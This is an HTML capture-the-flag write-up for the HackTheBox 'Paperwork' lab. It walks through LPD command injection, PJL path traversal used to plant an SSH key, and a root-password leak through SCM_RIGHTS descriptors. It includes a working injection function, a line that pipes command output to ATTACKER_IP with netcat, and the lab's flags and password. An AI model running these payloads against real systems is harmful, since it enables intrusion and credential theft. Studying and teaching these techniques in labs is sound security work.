@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Paperwork | Zakir Hussain</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+
+:root{
+  --bg:#0a0e17;
+  --bg-elev:#0e1420;
+  --bg-card:#111827;
+  --bg-code:#0b1018;
+  --border:#1e2838;
+  --border-soft:#172030;
+  --text:#dbe4ef;
+  --text-dim:#8b98ac;
+  --text-faint:#5b6678;
+  --accent:#2dd4a7;
+  --accent-soft:rgba(45,212,167,.12);
+  --accent-2:#38bdf8;
+  --warn:#f59e0b;
+  --danger:#ef4444;
+  --easy:#2dd4a7;
+  --medium:#f5a623;
+  --hard:#ef5a6f;
+  --mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+}
+@media (prefers-color-scheme: light){
+  :root{ color-scheme: dark; }
+}
+*{box-sizing:border-box;}
+html,body{margin:0;padding:0;}
+body{
+  background:
+    radial-gradient(1100px 500px at 15% -5%, rgba(45,212,167,.07), transparent 60%),
+    radial-gradient(900px 500px at 100% 0%, rgba(56,189,248,.05), transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:var(--sans);
+  font-size:16px;
+  line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+}
+::selection{background:var(--accent-soft); color:var(--text);}
+a{color:var(--accent-2); text-decoration:none;}
+a:hover{text-decoration:underline;}
+.wrap{max-width:860px; margin:0 auto; padding:0 24px 96px;}
+
+/* ---------- topbar ---------- */
+.topbar{
+  border-bottom:1px solid var(--border-soft);
+  background:rgba(10,14,23,.85);
+  backdrop-filter:blur(8px);
+  position:sticky; top:0; z-index:20;
+}
+.topbar-inner{
+  max-width:860px; margin:0 auto; padding:14px 24px;
+  display:flex; align-items:center; justify-content:space-between;
+  gap:12px; flex-wrap:wrap;
+}
+.back-link{
+  font-family:var(--mono); font-size:13px; color:var(--text-dim);
+  display:flex; align-items:center; gap:6px;
+}
+.back-link:hover{color:var(--accent); text-decoration:none;}
+.brand{
+  font-family:var(--mono); font-size:13px; color:var(--text-faint); letter-spacing:.03em;
+}
+
+/* ---------- hero ---------- */
+.hero{padding:48px 0 28px; border-bottom:1px solid var(--border-soft);}
+.eyebrow{
+  font-family:var(--mono); font-size:12.5px; color:var(--accent);
+  letter-spacing:.04em; margin:0 0 14px;
+  display:flex; align-items:center; gap:8px;
+}
+.eyebrow::before{content:"//"; color:var(--text-faint);}
+h1.machine-title{
+  font-family:var(--mono); font-weight:700; font-size:clamp(32px,6vw,48px);
+  margin:0 0 14px; color:#fff; letter-spacing:-.01em;
+}
+.badges{display:flex; flex-wrap:wrap; gap:8px; margin-bottom:20px;}
+.badge{
+  font-family:var(--mono); font-size:12px; padding:5px 11px; border-radius:5px;
+  border:1px solid var(--border); background:var(--bg-card); color:var(--text-dim);
+  display:inline-flex; align-items:center; gap:6px;
+}
+.badge.diff-Easy{color:var(--easy); border-color:rgba(45,212,167,.35); background:rgba(45,212,167,.08);}
+.badge.diff-Medium{color:var(--medium); border-color:rgba(245,166,35,.35); background:rgba(245,166,35,.08);}
+.badge.diff-Hard{color:var(--hard); border-color:rgba(239,90,111,.35); background:rgba(239,90,111,.08);}
+.badge.os{color:var(--accent-2);}
+.synopsis{color:var(--text-dim); font-size:16px; max-width:70ch; margin:0;}
+.tags{display:flex; flex-wrap:wrap; gap:6px; margin-top:18px;}
+.tag{
+  font-family:var(--mono); font-size:11.5px; color:var(--text-faint);
+  border:1px solid var(--border-soft); padding:3px 9px; border-radius:999px;
+}
+
+/* ---------- info table ---------- */
+.info-grid{
+  display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
+  gap:1px; background:var(--border-soft); border:1px solid var(--border-soft);
+  border-radius:10px; overflow:hidden; margin:28px 0 8px;
+}
+.info-cell{background:var(--bg-card); padding:14px 16px;}
+.info-cell .k{font-family:var(--mono); font-size:11px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.06em; margin-bottom:4px;}
+.info-cell .v{font-family:var(--mono); font-size:14px; color:var(--text);}
+
+/* ---------- section ---------- */
+section.phase{padding:40px 0; border-bottom:1px solid var(--border-soft);}
+section.phase:last-of-type{border-bottom:none;}
+.phase-head{display:flex; align-items:baseline; gap:12px; margin-bottom:6px;}
+.phase-num{font-family:var(--mono); color:var(--accent); font-size:14px;}
+h2.phase-title{font-family:var(--mono); font-size:22px; margin:0; color:#fff; font-weight:700;}
+.phase-intro{color:var(--text-dim); margin:10px 0 22px; max-width:72ch;}
+
+.step{margin:22px 0;}
+.step-title{
+  font-family:var(--mono); font-size:14.5px; color:var(--text); font-weight:700;
+  margin:0 0 4px; display:flex; align-items:center; gap:8px;
+}
+.step-title::before{content:"▸"; color:var(--accent);}
+.why{
+  font-size:14.5px; color:var(--text-dim); margin:6px 0 10px; padding-left:18px;
+  border-left:2px solid var(--border-soft);
+}
+.why b{color:var(--accent); font-family:var(--mono); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-right:6px;}
+
+pre{
+  background:var(--bg-code); border:1px solid var(--border);
+  border-radius:8px; padding:14px 16px; overflow-x:auto;
+  font-family:var(--mono); font-size:13px; line-height:1.55; margin:10px 0;
+  color:#c9d6e8;
+}
+pre.cmd{border-left:3px solid var(--accent);}
+pre.out{border-left:3px solid var(--accent-2); color:#9fb0c3;}
+code{font-family:var(--mono); font-size:.92em;}
+.inline-code{background:var(--bg-code); border:1px solid var(--border); border-radius:4px; padding:1px 6px; color:var(--accent); font-size:.88em;}
+
+.next{font-size:14.5px; color:var(--text-dim); margin:10px 0 0; padding-left:18px; border-left:2px solid rgba(56,189,248,.35);}
+.next b{color:var(--accent-2); font-family:var(--mono); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-right:6px;}
+
+.callout{
+  border:1px solid var(--border); border-left:3px solid var(--warn);
+  background:rgba(245,166,35,.06); border-radius:8px; padding:14px 18px; margin:18px 0;
+}
+.callout.cve{border-left-color:var(--danger); background:rgba(239,90,111,.06);}
+.callout .ctitle{font-family:var(--mono); font-size:12.5px; color:var(--warn); text-transform:uppercase; letter-spacing:.05em; margin-bottom:6px; font-weight:700;}
+.callout.cve .ctitle{color:var(--danger);}
+.callout p{margin:0; color:var(--text-dim); font-size:14.5px;}
+
+.flagbox{
+  font-family:var(--mono); background:var(--bg-code); border:1px dashed var(--border);
+  border-radius:8px; padding:12px 16px; margin:10px 0; display:flex; align-items:center; gap:10px;
+  font-size:13.5px; color:var(--accent);
+}
+.flagbox .lbl{color:var(--text-faint); font-size:11px; text-transform:uppercase; letter-spacing:.06em;}
+
+table.vulns{width:100%; border-collapse:collapse; margin:14px 0; font-size:14px;}
+table.vulns th, table.vulns td{border:1px solid var(--border-soft); padding:9px 12px; text-align:left;}
+table.vulns th{background:var(--bg-card); font-family:var(--mono); font-size:11.5px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.05em;}
+table.vulns td{color:var(--text-dim);}
+
+.chain{
+  font-family:var(--mono); font-size:12.5px; color:var(--text-dim);
+  background:var(--bg-code); border:1px solid var(--border); border-radius:8px;
+  padding:16px; overflow-x:auto; white-space:pre; margin:20px 0;
+}
+
+ul.rec-list{margin:10px 0; padding-left:0; list-style:none;}
+ul.rec-list li{
+  padding:8px 0 8px 26px; position:relative; color:var(--text-dim); font-size:14.5px;
+  border-bottom:1px solid var(--border-soft);
+}
+ul.rec-list li:last-child{border-bottom:none;}
+ul.rec-list li::before{content:"→"; position:absolute; left:0; color:var(--accent);}
+
+.summary-box{
+  background:var(--bg-card); border:1px solid var(--border); border-radius:10px;
+  padding:22px 24px; margin:24px 0;
+}
+.summary-box h3{font-family:var(--mono); font-size:15px; color:#fff; margin:0 0 10px;}
+
+footer.page-footer{
+  padding:40px 0 10px; text-align:center; color:var(--text-faint); font-family:var(--mono); font-size:12.5px;
+}
+footer.page-footer a{color:var(--text-dim);}
+.foot-nav{margin-bottom:14px;}
+
+@media (max-width:600px){
+  .wrap{padding:0 16px 72px;}
+  h1.machine-title{font-size:30px;}
+}
+
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="topbar-inner">
+    <a class="back-link" href="https://zak5886.github.io/Portfolio/#writeups">&larr; back to writeups</a>
+    <span class="brand">ZAKIR_HUSSAIN / HTB_WRITEUPS</span>
+  </div>
+</div>
+<div class="wrap">
+
+<div class="hero">
+  <p class="eyebrow">HTB_WRITEUP // paperwork.log</p>
+  <h1 class="machine-title">Paperwork</h1>
+  <div class="badges"><span class="badge diff-Easy">Easy</span><span class="badge os">Linux</span></div>
+  <p class="synopsis">Paperwork simulates a document-archiving and print-management environment built around three custom services chained together: a Line Printer Daemon vulnerable to command injection, a simulated JetDirect/PJL printer server with a path-traversal bug in its virtual filesystem, and an internal management daemon that leaks a root-equivalent password over a Unix socket via SCM_RIGHTS file-descriptor passing.</p>
+  <div class="tags"><span class="tag">nmap</span><span class="tag">lpd</span><span class="tag">rfc1179</span><span class="tag">command-injection</span><span class="tag">jetdirect</span><span class="tag">pjl</span><span class="tag">path-traversal</span><span class="tag">ssh-key-upload</span><span class="tag">unix-socket</span><span class="tag">scm-rights</span><span class="tag">password-reuse</span><span class="tag">fd-leak</span></div>
+</div>
+<div class="info-grid"><div class="info-cell"><div class="k">Target</div><div class="v">Paperwork</div></div><div class="info-cell"><div class="k">Difficulty</div><div class="v">Easy</div></div><div class="info-cell"><div class="k">OS</div><div class="v">Linux</div></div><div class="info-cell"><div class="k">Primary Vuln</div><div class="v">LPD Command Injection</div></div><div class="info-cell"><div class="k">CWE</div><div class="v">CWE-78 / CWE-22 / CWE-269</div></div><div class="info-cell"><div class="k">Priv-Esc</div><div class="v">SCM_RIGHTS fd leak + password reuse</div></div></div>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 1</span></div>
+  <h2 class="phase-title">Reconnaissance</h2>
+  <p class="phase-intro">A full port scan followed by inspection of what each exposed service actually does &mdash; this box's whole story is told by its unusual port, 1515, which turns out to be a hand-rolled print-job intake service.</p>
+  
+<div class="step">
+  <p class="step-title">Full TCP port scan</p>
+  <p class="why"><b>Why</b>A complete sweep, not just the top-1000 ports, since the real entry point sits on a non-standard port that a quick scan would miss entirely.</p>
+  <pre class="cmd">nmap -sC -sV -p- &lt;TARGET&gt; -oA scan</pre>
+  <pre class="out">22/tcp   open  ssh    OpenSSH (Ubuntu)
+80/tcp   open  http   nginx
+1515/tcp open  ?      Custom Archive_Printer service</pre>
+  <p class="next"><b>Next</b>Port 80 is the entry point for understanding what the custom LPD service on 1515 actually expects.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Inspect the web application</p>
+  <p class="why"><b>Why</b>Port 80 hosts a “Document Archiving Service” describing document submission over the LPD protocol (RFC 1179) and offering a source download at <span class="inline-code">/download/archive</span> &mdash; a huge gift, since it hands over the exact server code running on 1515.</p>
+  
+  
+  <p class="next"><b>Next</b>Download and read the LPD server's source rather than black-box fuzzing the protocol &mdash; source review is always faster when it's handed to you.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Review the LPD server source</p>
+  <p class="why"><b>Why</b>The downloaded ZIP contains <span class="inline-code">server.py</span>. Reading it line by line for anywhere user-controlled data reaches a shell call is the standard code-review pattern for finding command injection.</p>
+  <pre class="cmd">job_name = "Unknown"
+for line in decoded_content.split('\n'):
+    line = line.strip()
+    if line.startswith('J'):
+        job_name = line[1:]  # NO SANITIZATION!
+        break
+subprocess.Popen(f"echo 'Archive: {job_name}' &gt;&gt; /tmp/archive.log", shell=True)</pre>
+  
+  <p class="next"><b>Next</b>job_name comes straight from the client-supplied 'J' line of the LPD control file and is f-string-interpolated into a shell=True call with zero sanitization &mdash; textbook CWE-78 command injection.</p>
+</div>
+
+  
+</section>
+<div class="callout"><div class="ctitle">CWE-78 &mdash; OS Command Injection</div><p>The LPD server's job-name parser never validates or escapes the value before passing it to <span class="inline-code">subprocess.Popen(..., shell=True)</span>. Any string placed after the <span class="inline-code">J</span> prefix in the LPD control block is interpreted by a shell &mdash; closing the intended quote and chaining extra commands turns the “archive this print job” feature into arbitrary command execution as the <code>lp</code> user.</p></div>
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 2</span></div>
+  <h2 class="phase-title">Initial Access &mdash; LPD Command Injection</h2>
+  <p class="phase-intro">With the vulnerable code identified, the next step is speaking the LPD protocol directly in Python to deliver a crafted job name and confirm execution.</p>
+  
+<div class="step">
+  <p class="step-title">Implement the LPD protocol handshake</p>
+  <p class="why"><b>Why</b>LPD uses a short binary command set (RFC 1179): <code>\x02</code> opens a print job, after which the control file (containing the injectable <code>J</code> line) is sent with its declared size.</p>
+  <pre class="cmd">def inject_command(cmd):
+    s = socket.socket()
+    s.connect(("&lt;TARGET&gt;", 1515))
+    s.send(b'\x02archive_intake\n')
+    job_name = "'" + ";" + cmd + ";" + "echo '"
+    content = ("J" + job_name + "\n").encode()
+    s.send(b'\x02' + str(len(content)).encode() + b' ')
+    s.send(content)
+    return s.recv(4096)</pre>
+  
+  <p class="next"><b>Next</b>The payload closes the quoted string the server wraps job_name in, injects a semicolon-separated command, and reopens a dummy quote to keep the shell syntax valid.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Confirm code execution</p>
+  <p class="why"><b>Why</b>Piping the output of <code>id</code> to a netcat listener on the attacking host avoids needing to parse the LPD response for command output &mdash; a reliable way to confirm blind command injection.</p>
+  <pre class="cmd">inject_command("id | nc ATTACKER_IP PORT")</pre>
+  <pre class="out">uid=999(lp) gid=999(lp) groups=999(lp)</pre>
+  <p class="next"><b>Next</b>RCE confirmed as the lp user. Use this foothold to look around at what else is running locally &mdash; services bound to localhost are invisible from the outside scan.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 3</span></div>
+  <h2 class="phase-title">Internal Reconnaissance</h2>
+  <p class="phase-intro">From the lp shell, enumerate local listeners rather than assuming the externally-scanned ports are the whole picture &mdash; multi-service boxes almost always hide something on loopback.</p>
+  
+<div class="step">
+  <p class="step-title">Enumerate local-only services</p>
+  <p class="why"><b>Why</b>Checking what's bound to 127.0.0.1 from inside the box reveals an internal JetDirect/PJL printer emulator and a Flask web app, plus a root-owned Unix socket for a separate management daemon.</p>
+  
+  <pre class="out">127.0.0.1:9100   JetDirect PJL Server       (runs as: archivist)
+127.0.0.1:1337   Flask Web App              (runs as: root)
+/run/paperwork/mgmt.sock   Paperworks Daemon  (root, mode 660, archivist group)</pre>
+  <p class="next"><b>Next</b>user.txt sits in /home/archivist/user.txt but lp can't read it directly &mdash; the JetDirect service running as archivist is the path to that file.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 4</span></div>
+  <h2 class="phase-title">JetDirect / PJL Path Traversal</h2>
+  <p class="phase-intro">The internal JetDirect server speaks HP's PJL protocol and exposes a simulated filesystem for print-job staging. Pulling its own source code (the same trick as phase 1) revealed a path-traversal bug in how it resolves file paths.</p>
+  
+<div class="step">
+  <p class="step-title">Explore the virtual filesystem</p>
+  <p class="why"><b>Why</b>PJL's <span class="inline-code">FSQUERY</span> command lists files/directories on the simulated filesystem, confirming the service exposes its own source for download.</p>
+  <pre class="cmd">s.sendall(b'\x1b%-12345X@PJL\r\n')
+s.sendall(b'@PJL FSQUERY NAME="0:/"\r\n')</pre>
+  <pre class="out">. TYPE=DIR
+.. TYPE=DIR
+logs TYPE=DIR SIZE=4096
+jetdirect.py TYPE=FILE SIZE=5119</pre>
+  <p class="next"><b>Next</b>Pull jetdirect.py itself with FSUPLOAD and review it for the same class of bug found in the LPD server.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Extract and review the JetDirect source</p>
+  <p class="why"><b>Why</b><span class="inline-code">FSUPLOAD</span> in this service's custom naming reads a file from the server and sends it to the client &mdash; the naming is inverted from the official HP PJL spec, which is worth noting since it nearly caused a mix-up during testing.</p>
+  <pre class="cmd">s.sendall(b'@PJL FSUPLOAD NAME="jetdirect.py"\r\n')</pre>
+  
+  <p class="next"><b>Next</b>Read the Filesystem class's path-resolution logic for how it joins client-supplied paths to the root directory.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Identify the traversal bug</p>
+  <p class="why"><b>Why</b>The <span class="inline-code">_translate</span> method strips the <code>0:</code> prefix and backslashes, then joins the remainder onto the root directory with <code>os.path.normpath</code> &mdash; but never verifies the resolved path actually stays inside that root. A client-supplied <code>../</code> sequence walks straight out of the sandbox.</p>
+  <pre class="cmd">def _translate(self, path):
+    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+    return os.path.normpath(os.path.join(self._root, clean))</pre>
+  
+  <p class="next"><b>Next</b>Use ../ traversal with FSUPLOAD to read files outside the intended printer root, starting with archivist's user flag.</p>
+</div>
+
+  
+</section>
+<div class="callout"><div class="ctitle">CWE-22 &mdash; Path Traversal</div><p>The virtual filesystem's path translator normalizes <code>../</code> sequences but never checks that the resulting absolute path is still a descendant of the configured root directory. Combined with a reversed read/write naming convention (<code>FSUPLOAD</code> reads, <code>FSDOWNLOAD</code> writes &mdash; opposite of the real HP PJL spec), this gives arbitrary file read <em>and</em> write as the <code>archivist</code> user.</p></div>
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 5</span></div>
+  <h2 class="phase-title">Escalating to archivist via SSH Key Upload</h2>
+  <p class="phase-intro">Read access alone is useful for the flag, but write access through the same bug is what turns this into a real foothold as archivist &mdash; an attacker-controlled SSH key beats trying to crack or reuse a password.</p>
+  
+<div class="step">
+  <p class="step-title">Read the user flag through the traversal</p>
+  <p class="why"><b>Why</b>Reading one directory up from the printer root (<code>../user.txt</code>) resolves to <code>/home/archivist/user.txt</code>, confirming the traversal depth needed and the account that owns the JetDirect process.</p>
+  <pre class="cmd">s.sendall(b'@PJL FSUPLOAD NAME="../user.txt"\r\n')</pre>
+  <pre class="out">@PJL FSUPLOAD NAME="../user.txt" SIZE=33
+7b38f3a663aaf0f41c84870626e2ef77</pre>
+  <p class="next"><b>Next</b>The same traversal depth should let FSDOWNLOAD write into archivist's .ssh directory.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Write an SSH public key via FSDOWNLOAD</p>
+  <p class="why"><b>Why</b>Using the write primitive to drop a public key straight into <code>~/.ssh/authorized_keys</code> is a much cleaner foothold than anything requiring password guessing &mdash; it's immediate, stable, and survives independent of whatever else happens to the box.</p>
+  <pre class="cmd">s.sendall(b'@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE=' +
+          str(len(key)).encode() + b'\r\n')
+s.sendall(key)</pre>
+  
+  <p class="next"><b>Next</b>Authenticate over SSH using the matching private key.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">SSH in as archivist</p>
+  <p class="why"><b>Why</b>Standard key-based auth against the uploaded public key.</p>
+  <pre class="cmd">ssh -i exploit_key archivist@&lt;TARGET&gt;</pre>
+  <pre class="out">archivist@system:~$ whoami
+archivist</pre>
+  <p class="next"><b>Next</b>With a stable foothold as archivist, look for what root-owned services this account has special access to &mdash; starting with the management daemon's Unix socket noted during internal recon.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 6</span></div>
+  <h2 class="phase-title">Privilege Escalation &mdash; Paperworks Daemon SCM_RIGHTS Leak</h2>
+  <p class="phase-intro">The Paperworks management daemon watches the JetDirect server's command log for suspicious activity and, when triggered, sends a security alert over its Unix socket &mdash; carrying root-owned file descriptors along with it via SCM_RIGHTS ancillary data.</p>
+  <div class="callout cve"><div class="ctitle">CWE-269 / CWE-200 &mdash; Privilege Leak via SCM_RIGHTS</div><p>Unix sockets can pass open file descriptors between processes using <code>SCM_RIGHTS</code> ancillary messages. The daemon attaches descriptors for both its own log file and <code>/etc/paperwork/admin_pins.conf</code> to every alert it emits &mdash; any process that can connect to the socket and read the message receives those descriptors <em>with the daemon's own (root) access rights</em>, regardless of the connecting process's own permissions on those files.</p></div>
+<div class="step">
+  <p class="step-title">Trigger the security alert</p>
+  <p class="why"><b>Why</b>The daemon watches <code>commands.log</code> for specific trigger keywords (<code>FSQUERY</code>, <code>FSUPLOAD</code>, <code>FSDOWNLOAD</code>) &mdash; sending any PJL command containing one of these words causes it to log and fire an alert.</p>
+  <pre class="cmd">s.connect(("127.0.0.1", 9100))
+s.sendall(b'\x1b%-12345X@PJL\r\n')
+s.sendall(b'@PJL FSQUERY NAME="trigger"\r\n')</pre>
+  
+  <p class="next"><b>Next</b>Immediately connect to the management socket to receive the resulting alert and its attached file descriptors.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Connect to the management socket and receive the fds</p>
+  <p class="why"><b>Why</b><code>socket.recvmsg()</code> with an ancillary-data buffer retrieves both the alert text and the passed file descriptors; <code>struct.unpack</code> parses the raw fd numbers out of the SCM_RIGHTS control message.</p>
+  <pre class="cmd">s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect('/run/paperwork/mgmt.sock')
+msg_data, anc, flags, addr = s.recvmsg(16384, 1024)
+for level, type, content in anc:
+    if level == socket.SOL_SOCKET and type == socket.SCM_RIGHTS:
+        fds = struct.unpack('i' * (len(content) // 4), content)
+        for fd in fds:
+            os.lseek(fd, 0, os.SEEK_SET)
+            print(os.read(fd, 1024).decode())</pre>
+  <pre class="out">ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
+FD 0: [127.0.0.1] connected ... Command: @PJL FSQUERY NAME="trigger"
+FD 1: ADMIN_PASSWORD=ApparelMortuaryCedar22</pre>
+  <p class="next"><b>Next</b>One of the leaked descriptors points at a config file containing an admin password. Test it against the root account.</p>
+</div>
+
+  
+</section>
+<div class="callout"><div class="ctitle">CWE-257 &mdash; Password Reuse</div><p>The disclosed admin password is identical to the local <code>root</code> password &mdash; a critical operational failure independent of the technical fd-leak bug that exposed it in the first place.</p></div>
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 7</span></div>
+  <h2 class="phase-title">Root Access</h2>
+  <p class="phase-intro">The leaked admin credential is simply reused to escalate directly to root via <code>su</code>.</p>
+  
+<div class="step">
+  <p class="step-title">Switch to root</p>
+  <p class="why"><b>Why</b>A straightforward <code>su</code> using the password recovered from the leaked file descriptor confirms the final step of the chain &mdash; no further exploitation required.</p>
+  <pre class="cmd">su - root</pre>
+  <pre class="out">root@system:~# id
+uid=0(root) gid=0(root) groups=0(root)</pre>
+  
+</div>
+
+<div class="step">
+  <p class="step-title">Confirm root flag</p>
+  <p class="why"><b>Why</b>Final checkpoint confirming full system compromise.</p>
+  <pre class="cmd">cat /root/root.txt</pre>
+  <pre class="out">fcd5948fb6d34634fbacbaed73de8e83</pre>
+  
+</div>
+
+  
+</section>
+<div class="summary-box"><h3>Key Takeaways</h3><ul class="rec-list"><li>Never build shell commands with string interpolation on client-supplied data, even for something as innocuous-looking as a print-job name &mdash; use <code>subprocess.run()</code> with an argument list and no <code>shell=True</code>.</li><li>Any path-translation function that joins user input onto a root directory must verify the <em>resolved, absolute</em> path is still a descendant of that root (e.g. via <code>os.path.realpath</code> + prefix comparison) &mdash; <code>normpath</code> alone does not provide that guarantee.</li><li>Passing file descriptors over a Unix socket via SCM_RIGHTS grants the receiving process the sender’s own access rights to that descriptor &mdash; any service doing this must authenticate and authorize the connecting peer (SO_PEERCRED / credential checks) before attaching anything sensitive.</li><li>Password reuse between an application-layer admin account and the root OS account turns any leak of the former into full system compromise &mdash; enforce distinct credentials and rotate them independently.</li></ul></div>
+<footer class="page-footer">
+  <div class="foot-nav"><a href="https://zak5886.github.io/Portfolio/#writeups">&larr; All writeups</a> &nbsp;|&nbsp; <a href="https://zak5886.github.io/Portfolio/">Portfolio home</a></div>
+  Educational penetration testing writeup &middot; HackTheBox lab environment &middot; &copy; 2026 Zakir Hussain
+</footer>
+</div>
+</body>
+</html>
